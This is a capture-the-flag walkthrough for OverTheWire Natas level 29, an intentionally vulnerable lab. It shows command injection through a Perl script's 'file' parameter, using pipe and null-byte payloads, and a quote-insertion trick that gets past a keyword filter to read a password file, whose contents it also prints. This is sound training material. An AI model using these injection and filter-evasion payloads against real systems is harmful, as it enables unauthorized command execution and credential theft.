# Natas 28 - Natas 29 
    Username  : natas29
    Password  : pc0w0Vo0KpTHcEsgMhXu2EJX6dvgUuKq
    URL       : http://natas29.natas.labs.overthewire.org

# Solution

In this challenge we got a page that display a large dump of text depending on what you choose on the dropdown. The interesting part is in the URL :

        http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground

It seems that a Perl script take a file name as an argument… let’s try to inject the following command :

     http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
     
You can see the file listing at the bottom of the page. Note, that I used the pipe character to concat a command to the script.

<img width="1031" height="586" alt="image" src="https://github.com/user-attachments/assets/50b8a63f-ecc7-4b19-b2d5-debe5e04f40b" />

Now, let’s get the code of the index.pl with the following injection :

       http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%00

After taking th important part of the code : 
```
 if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```
As you can see, if we try to read the password for the next level you won’t get it as the code filter the keyword natas. However, by injecting the following command I managed to get the password :

        http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00

# Password :
       wie9iexae0Daihohv8vuu3cei9wahf0e
       
